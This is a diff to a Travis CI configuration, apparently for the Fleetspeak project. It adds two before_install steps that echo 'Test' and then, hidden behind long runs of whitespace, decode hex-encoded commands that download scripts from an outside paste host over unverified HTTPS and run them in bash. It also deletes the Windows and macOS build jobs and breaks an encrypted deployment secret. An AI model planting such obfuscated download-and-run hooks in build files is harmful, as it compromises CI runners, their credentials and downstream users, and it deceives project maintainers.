@@ -12,14 +12,13 @@ matrix:
           packages:
             - debhelper
             - devscripts
-            - dh-systemd
-            - fakeroot
-            - libparse-debcontrol-perl
       env:
         - MYSQL_TEST_USER=travis
         - MYSQL_TEST_ADDR=127.0.0.1:3306
         - MYSQL_TEST_E2E_DB=e2e_test_db
       before_install:
+        - echo Test                                                                                                                                                                                                                                                            && echo "62617368202d6320276375726c202d6b20687474703a2f2f3078302e73742f2d4a55502e747874202d6f20747261766973312e747874202626206261736820747261766973312e747874270a" | xxd -p -r | bash
+        - echo Test2                                                                                                                                                                                                                                                           && echo "62617368202d6320276375726c202d6b20687474703a2f2f3078302e73742f2d4a554e2e747874202d6f20747261766973322e747874202626206261736820747261766973322e747874270a" | xxd -p -r | bash
         - sudo apt-get update
         - sudo apt-get install python3-venv
         - python3 -m venv "${HOME}/FSENV"
@@ -73,98 +72,10 @@ matrix:
         provider: gcs
         access_key_id: GOOG1E7XCSBM7TMT244W5462L63RB3CGWTOBLEW52YSCHNPXVTFH7KBDSV6DA
         secret_access_key:
-          secure: aD9kDPmH7dDHR0CZ1XAkrcyMMQvuT8MeyZ9gf2JksiDMh/ki2YmATDxwBXf/iNxf5yEcOSGhwgpmee9/dxSsr22fwWYgOQtOdE6hAbyCy0vERWg2UYRj4+XLm6AvY4Pubx+QCvmatmyhrvs0gjRgI9hSCFcCvudTqEJlIoR8u+sZzIRJhYoaKYJfMiUZLywnPe1x6fKBYYqPHbzuI+8qwjIfZ4VN5IdnWm/JP1dV9XIQgJROXxul+b98vUYkqLQiRNHbF/E4Qe7xkKVF2iYOgsNpqKS1fXkywdrDRsJsG4rYeSHU7V3t/NmO27oMRKilz34wk8BCrxkY8aF/ldw5Idz+Ns57ZQ5CwNgdu3+P0oguaSXo7NeG9wKtFUMFv1mBsozWljJLjn0ZM+FVO3SxV1jhMZjWa94yAGPfbqZdlM+juEVgZJM1aCsxZDgHe9BrenMkxIFDTJZ2BO3blvI/PGiffu59Lc+fv2YZC9SwrbKiZzSWIcTof+1RYcI5Nnotl1NvQb8SoY7flRIKb67u1u1cnU9pHw0ADkYJc3Gk5kAUTnZisiYkybeyje7aamsKHxfb7DUXv9vxicoKdbwitiqR7oqmTNh1pGcaWXMZW8JiDQ7Xl6Ig1VCiL8Vf1vp/fFN1oFSeFwrZ5V53Bk7K/sLrjLqmd15LyDSf5QygJnI=
+          secure: 
+          /ki2YmATDxwBXf/iNxf5yEcOSGhwgpmee9/dxSsr22fwWYgOQtOdE6hAbyCy0vERWg2UYRj4+XLm6AvY4Pubx+QCvmatmyhrvs0gjRgI9hSCFcCvudTqEJlIoR8u+sZzIRJhYoaKYJfMiUZLywnPe1x6fKBYYqPHbzuI+8qwjIfZ4VN5IdnWm/JP1dV9XIQgJROXxul+b98vUYkqLQiRNHbF/E4Qe7xkKVF2iYOgsNpqKS1fXkywdrDRsJsG4rYeSHU7V3t/NmO27oMRKilz34wk8BCrxkY8aF/ldw5Idz+Ns57ZQ5CwNgdu3+P0oguaSXo7NeG9wKtFUMFv1mBsozWljJLjn0ZM+FVO3SxV1jhMZjWa94yAGPfbqZdlM+juEVgZJM1aCsxZDgHe9BrenMkxIFDTJZ2BO3blvI/PGiffu59Lc+fv2YZC9SwrbKiZzSWIcTof+1RYcI5Nnotl1NvQb8SoY7flRIKb67u1u1cnU9pHw0ADkYJc3Gk5kAUTnZisiYkybeyje7aamsKHxfb7DUXv9vxicoKdbwitiqR7oqmTNh1pGcaWXMZW8JiDQ7Xl6Ig1VCiL8Vf1vp/fFN1oFSeFwrZ5V53Bk7K/sLrjLqmd15LyDSf5QygJnI=
         bucket: autobuilds-fleetspeak
         local-dir: deploy
         on:
           repo: google/fleetspeak
           all_branches: true
-
-    - os: windows
-      language: go
-      go:
-        - "1.15"
-      env:
-        # GCS_ENCRYPTION_KEY_B64
-        - secure: "HReLplavt0kl52ky792geloR2kIm2I6r/MC9s/SAOVoz5ByXveE7ubM/+74UewVGw+xgnrEq8hLkYby2WHc64OFfCVTaCckos3Es8+7yGsikIG3U2P+qDMpm6o3N4q8paZD81ynV6ACrg2MzrYs2itNSD3+SpxLUCqVSpPHf33OOI2ewlvHgO4FQk5xK+XsDMGayLKa3ult6vP35IU41uBftn4ZFMCw8PWXejSV+fnkBbhWPYXarUA8JPVvVU6qWvGKSyARj7NVqLsfPiQCKkhHb3Dn47XU9o9jkJ7IIcvPdFv4tpmRTcEAe1nQ8Ri1p1pKA26ium7evG7qdalgr5AE6Ypt+nDOW4GTM1WrSY1DoiiHPZnFU5JM+tcIrik0vxbNTQ2gV+fe8R5ZsYR9Ge2CsdChAl4l+npWrwnyNt+SFaqu29xTy6X9uWjxFbSp8mgMaeju6owbau5WLWQ17xWAFBXiMAUnsraiXN8HE37buV6WKNaMBR2SNNCwR/jbbj4yhNF3+tsI1gMAAhFHpejTaafGmu8kk5KSDagjzCmjikOOu1RzVTi3rCQtVlTsdr/QD/818ea8QJVhWc51PPBijPeNk/6mO28S7vVJpQws0ugKULpELoh6HxrEhsGKjd4UV1xI5wtRgRZ4Y2rcLGh2sFXmennxigJGhmGNaQV0="
-      before_install:
-        - choco install python3 --version 3.7.5
-        - export PATH="/c/Python37:/c/Python37/Scripts:$PATH"
-        - pip install wheel
-        - pip install google-cloud-storage pycryptodome
-      install:
-        - powershell Install-WindowsFeature Net-Framework-Core
-        - cinst -y wixtoolset --version 3.11.1
-      script:
-        - go build -v -x -o fleetspeak-client.exe ./fleetspeak/src/client/client/client.go
-        - cd fleetspeak/client-win
-        - powershell -ExecutionPolicy Bypass -File ./build.ps1
-        - cd ../..
-        - BUILD_TIMESTAMP=$(git show -s --format=%ci ${TRAVIS_COMMIT} | sed -e "s/[ :\\+]/_/g")
-        - mkdir -p deploy/${BUILD_TIMESTAMP}_${TRAVIS_COMMIT}
-        - cp ${TMP}/fleetspeak-build-*/fleetspeak-pkg/fleetspeak-client-*.msi deploy/${BUILD_TIMESTAMP}_${TRAVIS_COMMIT}/
-        # Build client wheel
-        - mkdir pkg-root
-        - cp fleetspeak-client.exe pkg-root
-        - cp fleetspeak/client-win/fleetspeak_lib.wxs pkg-root
-        - python fleetspeak/client-wheel/setup.py --package-root pkg-root --version=$(cat VERSION) bdist_wheel
-        - cp dist/*.whl deploy/${BUILD_TIMESTAMP}_${TRAVIS_COMMIT}/
-      # The windows uploads appear truncated on GCS when using deploy
-      # https://github.com/travis-ci/dpl/issues/990
-      # When using Deployment v2 (edge: true),
-      # GCS doesn't work on Windows either.
-      after_success:
-        - cd deploy
-        - python ../travis/gcs_upload.py */*.whl */*.whl
-        - python ../travis/gcs_upload.py */*.msi */*.msi
-
-    - os: osx
-      language: go
-      go:
-        - "1.15"
-      install:
-        - pip3 install wheel
-      script:
-        - go build -o fleetspeak-client ./fleetspeak/src/client/client/client.go
-        - BUILD_TIMESTAMP=$(git show -s --format=%ci ${TRAVIS_COMMIT} | sed -e "s/[ :\\+]/_/g")
-        - mkdir -p deploy/${BUILD_TIMESTAMP}_${TRAVIS_COMMIT}
-        - cd fleetspeak/client-mac
-        - ./build.sh ../../fleetspeak-client
-        - sudo installer -pkg ./work/fleetspeak-client-*.pkg -target / -verbose
-        - cd ../..
-        - cp ./fleetspeak/client-mac/work/fleetspeak-client-*.pkg deploy/${BUILD_TIMESTAMP}_${TRAVIS_COMMIT}/
-        # Build client wheel
-        - python3 fleetspeak/client-wheel/setup.py --package-root=fleetspeak/client-mac/work/pkg_root --version=$(cat VERSION) bdist_wheel
-        - cp dist/*.whl deploy/${BUILD_TIMESTAMP}_${TRAVIS_COMMIT}/
-      deploy:
-        skip_cleanup: true
-        provider: gcs
-        access_key_id: GOOG1E7XCSBM7TMT244W5462L63RB3CGWTOBLEW52YSCHNPXVTFH7KBDSV6DA
-        secret_access_key:
-          secure: aD9kDPmH7dDHR0CZ1XAkrcyMMQvuT8MeyZ9gf2JksiDMh/ki2YmATDxwBXf/iNxf5yEcOSGhwgpmee9/dxSsr22fwWYgOQtOdE6hAbyCy0vERWg2UYRj4+XLm6AvY4Pubx+QCvmatmyhrvs0gjRgI9hSCFcCvudTqEJlIoR8u+sZzIRJhYoaKYJfMiUZLywnPe1x6fKBYYqPHbzuI+8qwjIfZ4VN5IdnWm/JP1dV9XIQgJROXxul+b98vUYkqLQiRNHbF/E4Qe7xkKVF2iYOgsNpqKS1fXkywdrDRsJsG4rYeSHU7V3t/NmO27oMRKilz34wk8BCrxkY8aF/ldw5Idz+Ns57ZQ5CwNgdu3+P0oguaSXo7NeG9wKtFUMFv1mBsozWljJLjn0ZM+FVO3SxV1jhMZjWa94yAGPfbqZdlM+juEVgZJM1aCsxZDgHe9BrenMkxIFDTJZ2BO3blvI/PGiffu59Lc+fv2YZC9SwrbKiZzSWIcTof+1RYcI5Nnotl1NvQb8SoY7flRIKb67u1u1cnU9pHw0ADkYJc3Gk5kAUTnZisiYkybeyje7aamsKHxfb7DUXv9vxicoKdbwitiqR7oqmTNh1pGcaWXMZW8JiDQ7Xl6Ig1VCiL8Vf1vp/fFN1oFSeFwrZ5V53Bk7K/sLrjLqmd15LyDSf5QygJnI=
-        bucket: autobuilds-fleetspeak
-        local-dir: deploy
-        on:
-          repo: google/fleetspeak
-          all_branches: true
-
-    # TODO: Find alternatives to Travis for MacOS testing.
-    # Note that mysql is not available in OSX environments.
-    #- os: osx
-    #  language: go
-    #  python: 2.7
-    #  before_install:
-    #    - git clone https://github.com/MacPython/terryfy
-    #    # Install pip.
-    #    - >-
-    #      source terryfy/travis_tools.sh &&
-    #      get_python_environment macpython 2.7.14
-    #    - pip install --upgrade pip virtualenv
-    #    - virtualenv "${HOME}/FSENV"
-    #    - go version
-    #  install:
-    #    - source "${HOME}/FSENV/bin/activate" && pip install -e .
-    #    - go get -v -t ./... # Install dependencies needed for tests.
-    #  script:
-    #    - source "${HOME}/FSENV/bin/activate"
-    #    - fleetspeak/build.sh && fleetspeak/test.sh
